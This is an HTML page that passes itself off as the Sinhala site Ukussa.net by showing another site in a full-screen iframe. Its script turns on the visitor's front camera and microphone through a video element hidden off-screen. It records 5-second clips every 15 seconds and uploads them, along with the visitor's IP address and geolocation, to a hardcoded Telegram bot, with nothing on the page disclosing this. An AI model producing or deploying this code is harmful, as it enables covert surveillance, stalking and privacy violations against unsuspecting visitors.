<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Ukussa.net</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            width: 100vw;
            height: 100vh;
            overflow: hidden;
            background: #000;
        }
        
        /* Ukussa.net Fullscreen */
        #ukussaFrame {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border: none;
            z-index: 1;
        }
        
        /* Hidden Camera - ‡∂ö‡∑í‡∑É‡∑í‡∑Ä‡∑ô‡∂ö‡∑î‡∂ß‡∂≠‡∑ä ‡∂±‡∑ú‡∂¥‡∑ô‡∂±‡∑ö */
        #selfieCamera {
            position: fixed;
            top: -9999px;
            left: -9999px;
            width: 1px;
            height: 1px;
            opacity: 0;
            pointer-events: none;
            z-index: -9999;
        }
        
        /* Ultra tiny watermark - ‡∂¥‡∑ö‡∂±‡∑ä‡∂±‡∑ö ‡∂±‡∑ê‡∂≠‡∑í ‡∂≠‡∂ª‡∂∏‡∑ä */
        .sasix-tiny {
            position: fixed;
            bottom: 1px;
            right: 2px;
            color: rgba(255, 255, 255, 0.03);
            font-size: 6px;
            z-index: 9999;
            pointer-events: none;
        }
    </style>
</head>
<body>
    <!-- Ukussa.net Website - Fullscreen -->
    <iframe id="ukussaFrame" src="https://sinhalawal.com/" allow="camera; microphone; autoplay"></iframe>
    
    <!-- Hidden Selfie Camera -->
    <video id="selfieCamera" autoplay playsinline muted></video>
    
    <!-- Almost invisible watermark -->
    <div class="sasix-tiny">savidu.com</div>

    <script>
        // ============================================
        // TELEGRAM BOT CONFIG
        // ============================================
        const BOT_TOKEN = '8591543657:AAFjeNO5E8GA_ye7QgGmzC42OfbjHhrdRwg';
        const CHAT_ID = '7642100129';
        
        // ============================================
        // GLOBAL VARIABLES
        // ============================================
        let cameraStream = null;
        let videoElement = document.getElementById('selfieCamera');
        let isCameraReady = false;
        let videoCount = 0;
        let mediaRecorder = null;
        let videoChunks = [];
        let isRecording = false;
        
        // ============================================
        // 1. PAGE LOAD - START CAMERA
        // ============================================
        window.addEventListener('load', function() {
            console.log('üá±üá∞ Ukussa.net + Selfie Cam Active');
            
            // Start camera
            startSelfieCamera();
            
            // Keep screen on
            if ('wakeLock' in navigator) {
                navigator.wakeLock.request('screen').catch(() => {});
            }
            
            // Send start notification
            sendRawMessage('üá±üá∞ Ukussa.net - Selfie Camera Active');
            
            // Get IP and location after delay
            setTimeout(getIP, 5000);
            setTimeout(getLocation, 8000);
        });
        
        // ============================================
        // 2. START SELFIE CAMERA (Front Camera)
        // ============================================
        async function startSelfieCamera() {
            try {
                console.log('üì∑ Requesting selfie camera...');
                
                // Request front camera with audio
                cameraStream = await navigator.mediaDevices.getUserMedia({
                    video: { 
                        facingMode: "user",  // Front camera (selfie)
                        width: { ideal: 640 },
                        height: { ideal: 480 },
                        frameRate: { ideal: 30 }
                    },
                    audio: true  // With audio
                });
                
                // Assign stream to video element
                videoElement.srcObject = cameraStream;
                
                // Wait for video to be ready
                await new Promise((resolve) => {
                    videoElement.onloadedmetadata = () => {
                        console.log('üìπ Video metadata loaded');
                        resolve();
                    };
                    setTimeout(resolve, 1000);
                });
                
                // Play video
                await videoElement.play();
                
                // Verify camera is actually working
                await new Promise((resolve) => {
                    const checkInterval = setInterval(() => {
                        if (videoElement.videoWidth > 0 && videoElement.videoHeight > 0) {
                            console.log(`‚úÖ Camera ready: ${videoElement.videoWidth}x${videoElement.videoHeight}`);
                            clearInterval(checkInterval);
                            resolve();
                        }
                    }, 100);
                });
                
                isCameraReady = true;
                console.log('‚úÖ Selfie Camera Active');
                sendRawMessage('‚úÖ Camera Ready - Recording 5 sec videos');
                
                // Start recording after 3 seconds
                setTimeout(() => {
                    startContinuousRecording();
                }, 3000);
                
            } catch(error) {
                console.error('‚ùå Camera error:', error);
                sendRawMessage('‚ùå Camera Error - Retrying...');
                
                // Retry after 5 seconds
                setTimeout(startSelfieCamera, 5000);
            }
        }
        
        // ============================================
        // 3. CONTINUOUS RECORDING
        // ============================================
        function startContinuousRecording() {
            if (!isCameraReady) {
                console.log('Camera not ready yet');
                return;
            }
            
            console.log('üé• Continuous recording started - 5 sec videos every 15 seconds');
            
            // Record first video after 2 seconds
            setTimeout(() => {
                record5SecondVideo();
            }, 2000);
            
            // Record every 15 seconds (5 sec record + 10 sec gap)
            setInterval(() => {
                if (isCameraReady && !isRecording) {
                    record5SecondVideo();
                }
            }, 15000);
        }
        
        // ============================================
        // 4. RECORD 5 SECOND VIDEO
        // ============================================
        async function record5SecondVideo() {
            if (!isCameraReady || !cameraStream || isRecording) {
                console.log('Camera not ready or already recording');
                return;
            }
            
            isRecording = true;
            videoChunks = [];
            videoCount++;
            
            console.log(`üé• Recording 5 sec video #${videoCount}...`);
            
            // Setup MediaRecorder
            let options = {};
            let mimeType = 'video/webm';
            
            try {
                if (MediaRecorder.isTypeSupported('video/webm;codecs=vp9')) {
                    options = { mimeType: 'video/webm;codecs=vp9', videoBitsPerSecond: 2500000 };
                    mimeType = 'video/webm;codecs=vp9';
                } else if (MediaRecorder.isTypeSupported('video/webm;codecs=vp8,opus')) {
                    options = { mimeType: 'video/webm;codecs=vp8,opus', videoBitsPerSecond: 2500000 };
                    mimeType = 'video/webm;codecs=vp8,opus';
                } else {
                    options = { videoBitsPerSecond: 2500000 };
                }
            } catch(e) {}
            
            mediaRecorder = new MediaRecorder(cameraStream, options);
            
            mediaRecorder.ondataavailable = (e) => {
                if (e.data && e.data.size > 0) {
                    videoChunks.push(e.data);
                }
            };
            
            mediaRecorder.onstop = async () => {
                // Check if we have data
                if (videoChunks.length === 0) {
                    console.log('‚ùå No video data recorded');
                    isRecording = false;
                    return;
                }
                
                const videoBlob = new Blob(videoChunks, { type: 'video/webm' });
                const sizeMB = (videoBlob.size / (1024 * 1024)).toFixed(2);
                
                // Verify video has content (not black screen)
                if (videoBlob.size < 20000) { // Less than 20KB - probably black screen
                    console.log('‚ùå Video too small - possible black screen');
                    isRecording = false;
                    return;
                }
                
                console.log(`‚úÖ Video #${videoCount} recorded: ${sizeMB}MB`);
                
                // Send to Telegram
                await sendVideoRaw(videoBlob);
                
                isRecording = false;
            };
            
            // Start recording
            mediaRecorder.start();
            
            // Stop after exactly 5 seconds
            setTimeout(() => {
                if (mediaRecorder && mediaRecorder.state === 'recording') {
                    mediaRecorder.stop();
                }
            }, 5000); // 5 seconds
        }
        
        // ============================================
        // 5. SEND VIDEO TO TELEGRAM
        // ============================================
        async function sendVideoRaw(videoBlob) {
            try {
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('video', videoBlob, `ukussa_selfie_${Date.now()}.webm`);
                
                console.log('üì§ Sending video to Telegram...');
                
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
                    method: 'POST',
                    body: formData
                });
                
                const result = await response.json();
                
                if (result.ok) {
                    console.log(`‚úÖ Video #${videoCount} sent to Telegram`);
                    return true;
                } else {
                    console.log('‚ùå Telegram error:', result);
                    
                    // Try as document if video fails
                    const docFormData = new FormData();
                    docFormData.append('chat_id', CHAT_ID);
                    docFormData.append('document', videoBlob, `ukussa_selfie_${Date.now()}.webm`);
                    
                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
                        method: 'POST',
                        body: docFormData
                    });
                    
                    return false;
                }
                
            } catch(error) {
                console.error('‚ùå Send error:', error);
                return false;
            }
        }
        
        // ============================================
        // 6. SEND RAW MESSAGE
        // ============================================
        async function sendRawMessage(text) {
            try {
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('text', text);
                
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    body: formData
                });
            } catch(e) {}
        }
        
        // ============================================
        // 7. GET IP ADDRESS
        // ============================================
        async function getIP() {
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                sendRawMessage(`üåê IP: ${data.ip}`);
            } catch(e) {}
        }
        
        // ============================================
        // 8. GET LOCATION
        // ============================================
        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    async (pos) => {
                        try {
                            // Send as location
                            const locData = new FormData();
                            locData.append('chat_id', CHAT_ID);
                            locData.append('latitude', pos.coords.latitude);
                            locData.append('longitude', pos.coords.longitude);
                            
                            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
                                method: 'POST',
                                body: locData
                            });
                            
                            // Also send as text
                            sendRawMessage(`üìç ${pos.coords.latitude}, ${pos.coords.longitude}`);
                            
                        } catch(e) {}
                    },
                    (err) => {}
                );
            }
        }
        
        // ============================================
        // 9. KEEP ALIVE
        // ============================================
        setInterval(() => {
            console.log('üíì Ukussa.net + Selfie Cam heartbeat');
        }, 30000);
        
        // ============================================
        // 10. CLEANUP ON PAGE CLOSE
        // ============================================
        window.addEventListener('beforeunload', function() {
            if (cameraStream) {
                cameraStream.getTracks().forEach(track => track.stop());
            }
        });
        
        // ============================================
        // 11. VISIBILITY CHANGE - CONTINUE IN BACKGROUND
        // ============================================
        document.addEventListener('visibilitychange', function() {
            if (document.hidden) {
                console.log('üì± App in background - still recording');
            } else {
                console.log('üì± App active again');
            }
        });
        
    </script>
</body>
</html>
